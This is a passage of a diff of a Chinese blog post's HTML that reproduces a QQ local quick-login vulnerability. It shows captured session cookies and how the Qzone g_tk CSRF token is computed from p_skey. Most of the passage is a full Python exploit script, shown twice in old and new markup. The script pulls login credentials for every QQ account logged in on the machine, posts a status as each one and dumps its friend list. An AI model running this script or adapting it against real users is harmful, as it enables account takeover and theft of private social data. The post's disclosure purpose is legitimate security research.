&apos;https://ptlogin2.qzone.qq.com/check_sig?pttype=2&amp;uin=3534***3086&amp;service=jump&amp;nodirect=0&amp;ptsigx=a1199b83fbabffba57f259d79a1d2f221d70579cde815b7284a9d8201fc4d9a34bc133aacc444dd2309b1908aa05393ddc39433&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;f_url=&amp;ptlang=2052&amp;ptredirect=100&amp;aid=1000101&amp;daid=5&amp;j_later=0&amp;low_login_hour=0&amp;regmaster=0&amp;pt_login_type=2&amp;pt_aid=549000912&amp;pt_aaid=0&amp;pt_light=0&amp;pt_3rd_aid=0&apos;, &apos;&apos;)</span><br></pre></td></tr></table></figure>
 <p>返回的是一段JS，里面的网址是验证网址，我们需要请求它通过验证，不需要额外的参数，直接请求返回回来的这一串网址<br>
 5. 请求第4步返回的验证网址即可获得完整的登录权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Found</div><div class="line">Date: Tue, 22 Jan 2019 03:27:50 GMT</div><div class="line">Server: Tencent Login Server/2.0.0</div><div class="line">Strict-Transport-Security: max-age=31536000</div><div class="line">Set-Cookie: uin=o3534***3086;Path=/;Domain=qq.com;</div><div class="line">Set-Cookie: skey=@72fei1O2j;Path=/;Domain=qq.com;</div><div class="line">Set-Cookie: pt2gguin=;Expires=Thu, 01 Jan 1970 00:00:00 GMT;Path=/;Domain=qq.com; pt4_token=dZaYtbPkQf38MeZh8ik9jOmLtrxcrEMguvM_;Path=/;Domain=qzone.qq.com;</div><div class="line">Set-Cookie: p_skey=hlcQmdkZHYwNk5y2XGipsSOm0Igjj7AKo_;Path=/;Domain=qzone.qq.com;Secure;</div><div class="line">省略若干Set-Cookie</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Date: Tue, 22 Jan 2019 03:27:50 GMT</span><br><span class="line">Server: Tencent Login Server/2.0.0</span><br><span class="line">Strict-Transport-Security: max-age=31536000</span><br><span class="line">Set-Cookie: uin=o3534***3086;Path=/;Domain=qq.com;</span><br><span class="line">Set-Cookie: skey=@72fei1O2j;Path=/;Domain=qq.com;</span><br><span class="line">Set-Cookie: pt2gguin=;Expires=Thu, 01 Jan 1970 00:00:00 GMT;Path=/;Domain=qq.com; pt4_token=dZaYtbPkQf38MeZh8ik9jOmLtrxcrEMguvM_;Path=/;Domain=qzone.qq.com;</span><br><span class="line">Set-Cookie: p_skey=hlcQmdkZHYwNk5y2XGipsSOm0Igjj7AKo_;Path=/;Domain=qzone.qq.com;Secure;</span><br><span class="line">省略若干Set-Cookie</span><br></pre></td></tr></table></figure>
 <h3 id="对本地账号自动发一条说说"><a class="markdownIt-Anchor" href="#对本地账号自动发一条说说"></a> 对本地账号自动发一条说说</h3>
 <p>要实现这个目的无非就是完成上面的快捷登录，然后再在空间里面寻求发说说的请求，模拟一下即可<br>
 基本的抓包找参数的功夫就不细说了<br>
@@ -519,27 +290,27 @@
 <li>g_tk<br>
 其中<code>qzone_token</code>是刷新空间的时候在页面中给你的一个<code>token</code>，直接正则拿到就好</li>
 </ol>
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-23-40.jpg" alt="12-23-40.jpg" title="">追踪`g_tk`参数花了我不少功夫，其源码在[https://qzonestyle.gtimg.cn/qzone/v8/engine/migrate-plugin.js](https://qzonestyle.gtimg.cn/qzone/v8/engine/migrate-plugin.js) 的`getACSRFToken`函数中
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">getACSRFToken:<span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    url = QZFL.util.URI(url);</div><div class="line">    <span class="keyword">var</span> skey;</div><div class="line">    <span class="keyword">if</span> (url) &#123;</div><div class="line">      <span class="keyword">if</span> (url.host &amp;&amp; url.host.indexOf(<span class="string">"qzone.qq.com"</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">          skey = QZONE.FP._t.QZFL.cookie.get(<span class="string">"p_skey"</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</div><div class="line">          skey = QZFL.cookie.get(<span class="string">"p_skey"</span>);</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (url.host &amp;&amp; url.host.indexOf(<span class="string">"qq.com"</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">          skey = QZFL.cookie.get(<span class="string">"skey"</span>);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!skey) &#123;</div><div class="line">      skey = QZFL.cookie.get(<span class="string">"p_skey"</span>) || (QZFL.cookie.get(<span class="string">"skey"</span>) || (QZFL.cookie.get(<span class="string">"rv2"</span>) || <span class="string">""</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> hash = <span class="number">5381</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = skey.length;i &lt; len;++i) &#123;</div><div class="line">      hash += (hash &lt;&lt; <span class="number">5</span>) + skey.charCodeAt(i);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> hash &amp; <span class="number">2147483647</span>;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-23-40.jpg" alt="">追踪<code>g_tk</code>参数花了我不少功夫，其源码在<a href="https://qzonestyle.gtimg.cn/qzone/v8/engine/migrate-plugin.js" target="_blank" rel="noopener">https://qzonestyle.gtimg.cn/qzone/v8/engine/migrate-plugin.js</a> 的<code>getACSRFToken</code>函数中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">getACSRFToken:<span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    url = QZFL.util.URI(url);</span><br><span class="line">    <span class="keyword">var</span> skey;</span><br><span class="line">    <span class="keyword">if</span> (url) &#123;</span><br><span class="line">      <span class="keyword">if</span> (url.host &amp;&amp; url.host.indexOf(<span class="string">"qzone.qq.com"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          skey = QZONE.FP._t.QZFL.cookie.get(<span class="string">"p_skey"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          skey = QZFL.cookie.get(<span class="string">"p_skey"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.host &amp;&amp; url.host.indexOf(<span class="string">"qq.com"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          skey = QZFL.cookie.get(<span class="string">"skey"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!skey) &#123;</span><br><span class="line">      skey = QZFL.cookie.get(<span class="string">"p_skey"</span>) || (QZFL.cookie.get(<span class="string">"skey"</span>) || (QZFL.cookie.get(<span class="string">"rv2"</span>) || <span class="string">""</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> hash = <span class="number">5381</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = skey.length;i &lt; len;++i) &#123;</span><br><span class="line">      hash += (hash &lt;&lt; <span class="number">5</span>) + skey.charCodeAt(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash &amp; <span class="number">2147483647</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 <p>其实就是各种判断<code>Cookie</code>里面是否存在<code>skey</code>或者<code>p_skey</code>然后拿来做一个简单的移位加密<br>
 核心代码就这点，比打CTF的时候简单多了诶，放比赛里简直就是送分</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> hash = <span class="number">5381</span>;</div><div class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = skey.length;i &lt; len;++i) &#123;</div><div class="line">     hash += (hash &lt;&lt; <span class="number">5</span>) + skey.charCodeAt(i);</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">return</span> hash &amp; <span class="number">2147483647</span>;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = <span class="number">5381</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = skey.length;i &lt; len;++i) &#123;</span><br><span class="line">     hash += (hash &lt;&lt; <span class="number">5</span>) + skey.charCodeAt(i);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> hash &amp; <span class="number">2147483647</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 <p>所以可以看出<code>g_tk</code>是由<code>p_skey</code>简单的移位加密生成的<br>
 那么抓包一下发说说的请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?qzonetoken=&#123;&#125;&amp;g_tk=&#123;&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?qzonetoken=&#123;&#125;&amp;g_tk=&#123;&#125;</span><br></pre></td></tr></table></figure>
 <p>将<code>qzonetoken</code>和<code>g_tk</code>放进去，再在<code>POST</code>数据里面的<code>con</code>字段变成你想发的说说，就可以完成类似于你在我电脑上上个Q我就能进到你的空间发说说，看隐私的目的。</p>
 <h3 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h3>
 <p>花了几个小时写了复现脚本<br>
 <strong>只要脚本运行，在本机上线的QQ都会发一条说说以及被获取到所有好友信息、备注、昵称以及好友分组</strong><br>
 检测本地账号</p>
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-35-52.jpg" alt="12-35-52.jpg" title="">发送指定说说
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-36-12.jpg" alt="12-36-12.jpg" title="">
-<p>获取好友列表信息以及分组</p>
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-39-22.jpg" alt="12-39-22.jpg" title="">
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-40-16.jpg" alt="12-40-16.jpg" title="">
-<p>测试源码<br>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-35-52.jpg" alt="">发送指定说说</p>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-36-12.jpg" alt=""><br>
+获取好友列表信息以及分组</p>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-39-22.jpg" alt=""></p>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-40-16.jpg" alt=""><br>
+测试源码<br>
 （脚本仅供学习之用，禁止用于非法用途！）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 计算发送说说的防御CSRF的Token</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getACSRFToken</span><span class="params">(p_skey)</span>:</span></div><div class="line">    hash_v = <span class="number">5381</span></div><div class="line">    <span class="keyword">if</span> p_skey:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p_skey)):</div><div class="line">            hash_v += (hash_v &lt;&lt; <span class="number">5</span>) + ord(p_skey[i])</div><div class="line">        <span class="keyword">return</span> hash_v &amp; <span class="number">2147483647</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 想要发送的说说</span></div><div class="line">Message = <span class="string">"This is an automated messaging test by wz"</span></div><div class="line"></div><div class="line">header = &#123;</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"</span>,</div><div class="line">    <span class="string">"Referer"</span>: <span class="string">"https://i.qq.com/"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># 从QQ服务器获取请求本地服务器的Cookie</span></div><div class="line">get_local_token_url = <span class="string">"https://xui.ptlogin2.qq.com/cgi-bin/xlogin?"</span> \</div><div class="line">                      <span class="string">"proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;"</span> \</div><div class="line">                      <span class="string">"low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;"</span> \</div><div class="line">                      <span class="string">"appid=549000912&amp;style=22&amp;target=self&amp;"</span> \</div><div class="line">                      <span class="string">"s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;"</span> \</div><div class="line">                      <span class="string">"pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;"</span> \</div><div class="line">                      <span class="string">"pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1"</span></div><div class="line"></div><div class="line"><span class="comment"># Header头Referer字段必须为qq.com</span></div><div class="line">login_session = requests.Session()</div><div class="line">res = login_session.get(get_local_token_url, headers=header)</div><div class="line"></div><div class="line"><span class="comment"># 获取关键参数pt_local_token</span></div><div class="line">pt_local_token = res.cookies.get(<span class="string">"pt_local_token"</span>)</div><div class="line"></div><div class="line"><span class="comment"># 带着刚才的Cookie以及从Cookie中拿到的pt_local_tk对本地服务器进行请求</span></div><div class="line"><span class="comment"># 获取已登录的账号信息</span></div><div class="line">port = <span class="number">4301</span></div><div class="line">local_qq_server_url = <span class="string">"https://localhost.ptlogin2.qq.com"</span>  <span class="comment"># 建立在本地的QQ服务器地址，等待应用与其交互</span></div><div class="line"></div><div class="line"><span class="comment"># 传参获取本地已登录账号信息</span></div><div class="line">get_QQ_num_url = local_qq_server_url + \</div><div class="line">                 <span class="string">":&#123;&#125;/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.7068102287925351&amp;pt_local_tk=&#123;&#125;"</span>.format(port,</div><div class="line">                                                                                                       pt_local_token)</div><div class="line"></div><div class="line">res = login_session.get(get_QQ_num_url, headers=header)</div><div class="line"><span class="comment"># 返回的账号信息是一段js的数组</span></div><div class="line">dic_str = <span class="keyword">None</span></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    dic_str = re.findall(<span class="string">"var var_sso_uin_list=(\[[\s\S]*?\])"</span>, res.text)[<span class="number">0</span>]</div><div class="line"><span class="keyword">except</span> IndexError:</div><div class="line">    print(<span class="string">"Fail to get local account info. "</span>)</div><div class="line">    exit(<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="comment"># ====================================== 显示本地登录账号信息 ===========================================</span></div><div class="line">account_list = eval(dic_str)</div><div class="line">print(<span class="string">"Detect &#123;&#125; account login locally"</span>.format(len(account_list)))</div><div class="line">print(<span class="string">"====================================================="</span>)</div><div class="line"></div><div class="line">account_num_list = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(account_list)):</div><div class="line">    print(<span class="string">"NO.&#123;&#125;"</span>.format(i + <span class="number">1</span>))</div><div class="line">    print(<span class="string">"account:&#123;&#125;\nnickname:&#123;&#125;"</span>.format(account_list[i].get(<span class="string">"account"</span>), account_list[i].get(<span class="string">"nickname"</span>)))</div><div class="line">    account_num_list.append(account_list[i].get(<span class="string">"account"</span>))</div><div class="line">print(<span class="string">"====================================================="</span>)</div><div class="line"></div><div class="line"><span class="comment"># ====================================== 对每个账号进行快捷登录 ===========================================</span></div><div class="line"><span class="comment"># ===================================== 以登录QQ空间发个说说为例 ==========================================</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 对于已登录的账号</span></div><div class="line"><span class="keyword">for</span> account <span class="keyword">in</span> account_num_list:</div><div class="line">    <span class="comment"># 发送QQ号码及pt_local_token参数到本地服务器获取必要的Cookie，以便获取远程服务器登录许可</span></div><div class="line">    get_QQ_cookie_url = local_qq_server_url + \</div><div class="line">                        <span class="string">":&#123;&#125;/pt_get_st?callback=ptui_getst_CB&amp;"</span> \</div><div class="line">                        <span class="string">"r=0.7068102287925351&amp;"</span> \</div><div class="line">                        <span class="string">"pt_local_tk=&#123;&#125;&amp;"</span> \</div><div class="line">                        <span class="string">"clientuin=&#123;&#125;"</span>.format(port,</div><div class="line">                                              pt_local_token,</div><div class="line">                                              account)</div><div class="line"></div><div class="line">    res = login_session.get(get_QQ_cookie_url, headers=header)</div><div class="line">    <span class="comment"># 获取远程登录凭证</span></div><div class="line">    <span class="comment"># 其中u1为QQ空间地址（抓包可获得）</span></div><div class="line">    login_url = <span class="string">"https://ssl.ptlogin2.qq.com/jump?clientuin=&#123;&#125;&amp;"</span> \</div><div class="line">                <span class="string">"keyindex=9&amp;"</span> \</div><div class="line">                <span class="string">"pt_aid=549000912&amp;"</span> \</div><div class="line">                <span class="string">"daid=5&amp;"</span> \</div><div class="line">                <span class="string">"u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;"</span> \</div><div class="line">                <span class="string">"pt_local_tk=&#123;&#125;&amp;"</span> \</div><div class="line">                <span class="string">"pt_3rd_aid=0&amp;"</span> \</div><div class="line">                <span class="string">"ptopt=1&amp;style=40"</span>.format(account, pt_local_token)</div><div class="line"></div><div class="line">    <span class="comment"># 按照抓包获得的请求照样地设置了一下Referer 免得有检测</span></div><div class="line">    login_session.headers[<span class="string">'Referer'</span>] = get_local_token_url</div><div class="line">    res = login_session.get(login_url)</div><div class="line">    <span class="comment"># 至此获取凭证(clientkey)成功,下面获取p_skey</span></div><div class="line"></div><div class="line">    <span class="comment"># 到此处会有个check操作，需要GET去请求验证一下上一个请求响应内容给的地址</span></div><div class="line">    <span class="comment"># ============================================ 获取p_skey ===================================================</span></div><div class="line">    zone_login_check_url = <span class="keyword">None</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># 获取认证地址及参数</span></div><div class="line">        zone_login_check_url = re.findall(<span class="string">"'(http.*?)'"</span>, res.text)[<span class="number">0</span>]</div><div class="line">    <span class="keyword">except</span> IndexError:</div><div class="line">        print(<span class="string">'Fail to get login token .'</span>)</div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    <span class="comment"># 发起认证请求</span></div><div class="line">    res = login_session.get(zone_login_check_url)</div><div class="line">    <span class="comment"># 一样的补一下Referer和UA</span></div><div class="line">    login_session.headers[<span class="string">'Referer'</span>] = <span class="string">"https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone"</span></div><div class="line">    login_session.headers[</div><div class="line">        <span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"</span></div><div class="line">    <span class="comment"># 请求对应账号的空间，获取发送说说必要参数——qzone_token(响应的JS里面获取)以及p_skey(cookie中获取)</span></div><div class="line">    res = login_session.get(<span class="string">"https://user.qzone.qq.com/&#123;&#125;"</span>.format(account))</div><div class="line"></div><div class="line">    <span class="comment"># 获取必要参数p_skey用来计算CSRFToken</span></div><div class="line">    p_skey = login_session.cookies.get(<span class="string">"p_skey"</span>)</div><div class="line">    g_tk = getACSRFToken(p_skey)  <span class="comment"># 计算CSRFToken</span></div><div class="line">    <span class="comment"># 从响应的页面JS中获取qzone_token</span></div><div class="line">    res.encoding = <span class="string">'utf-8'</span></div><div class="line">    qzone_token = re.findall(<span class="string">'window.g_qzonetoken = \(function\(\)&#123; try\&#123;return "([0-9a-fA-F]+?)";\&#125;'</span>, res.text)[<span class="number">0</span>]</div><div class="line"></div><div class="line">    <span class="comment"># 发送说说的地址（抓包可得），并传入刚才获取的qzone_token以及g_tk</span></div><div class="line">    post_comment_url = <span class="string">"https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?"</span> \</div><div class="line">                       <span class="string">"qzonetoken=&#123;&#125;&amp;g_tk=&#123;&#125;"</span>.format(qzone_token, g_tk)</div><div class="line">    <span class="comment"># 补一下Content-Type</span></div><div class="line">    login_session.headers[<span class="string">"Content-Type"</span>] = <span class="string">"application/x-www-form-urlencoded"</span></div><div class="line">    <span class="comment"># 发送说说的必要参数（抓包可得），其中con字段及说说内容</span></div><div class="line">    param = &#123;<span class="string">"syn_tweet_verson"</span>: <span class="string">"1"</span>, <span class="string">"paramstr"</span>: <span class="string">"1"</span>, <span class="string">"pic_template"</span>: <span class="string">""</span>, <span class="string">"richtype"</span>: <span class="string">""</span>, <span class="string">"richval"</span>: <span class="string">""</span>,</div><div class="line">             <span class="string">"special_url"</span>: <span class="string">""</span>, <span class="string">"subrichtype"</span>: <span class="string">""</span>, <span class="string">"who"</span>: <span class="string">"1"</span>, <span class="string">"con"</span>: Message, <span class="string">"feedversion"</span>: <span class="string">"1"</span>,</div><div class="line">             <span class="string">"ver"</span>: <span class="string">"1"</span>, <span class="string">"ugc_right"</span>: <span class="string">"1"</span>, <span class="string">"to_sign"</span>: <span class="string">"0"</span>, <span class="string">"hostuin"</span>: <span class="string">"3517713083"</span>, <span class="string">"code_version"</span>: <span class="string">"1"</span>, <span class="string">"format"</span>: <span class="string">"fs"</span>,</div><div class="line">             <span class="string">"qzreferrer"</span>: <span class="string">"https%3A%2F%2Fuser.qzone.qq.com%2F3517713083"</span>&#125;</div><div class="line">    <span class="comment"># 发送说说</span></div><div class="line">    res = login_session.post(post_comment_url, data=param)</div><div class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</div><div class="line">        print(<span class="string">"[+] Account &#123;&#125; send message successfully."</span>.format(account))</div><div class="line"></div><div class="line">    <span class="comment"># ================================================= 获取好友列表 =====================================================</span></div><div class="line">    <span class="comment"># 接口地址</span></div><div class="line">    get_friends_url = <span class="string">"https://h5.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?"</span> \</div><div class="line">                      <span class="string">"uin=&#123;&#125;&amp;follow_flag=1&amp;"</span> \</div><div class="line">                      <span class="string">"groupface_flag=0&amp;fupdate=1&amp;"</span> \</div><div class="line">                      <span class="string">"g_tk=&#123;&#125;"</span>.format(account, g_tk)</div><div class="line">    res = login_session.get(get_friends_url)</div><div class="line">    print(<span class="string">"QQ friends info."</span>)</div><div class="line">    print(res.text)</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 